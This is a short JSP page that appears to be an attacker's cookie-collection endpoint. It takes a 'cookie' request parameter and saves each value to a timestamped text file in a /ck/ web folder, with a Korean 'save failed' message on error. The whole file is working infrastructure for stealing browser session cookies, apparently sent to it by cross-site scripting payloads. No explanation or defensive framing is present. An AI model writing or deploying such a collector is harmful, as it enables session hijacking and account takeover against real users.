<%@ page contentType="text/html; charset=UTF-8" %>
<%@ page language="java" import="java.util.*,java.text.*,java.io.*" %>

<%
  request.setCharacterEncoding("UTF-8");
  String cookie=request.getParameter("cookie");
  Date now=new Date();
  long time=now.getTime();
  String fName=time+".txt";

  PrintWriter pw=null;
  try
  {
    String path="/ck/";
    String filePath=application.getRealPath(path)+fName;
    out.println(path+fName+"<br>"+filePath);
    pw = new PrintWriter(filePath);
    pw.println("cookie : "+cookie);
  } catch(IOException e)
  {
    out.println("저장 실패");
  } finally
  {
    try
    {
      pw.close();
    } catch(Exception e)
    {
    }
  }
%>
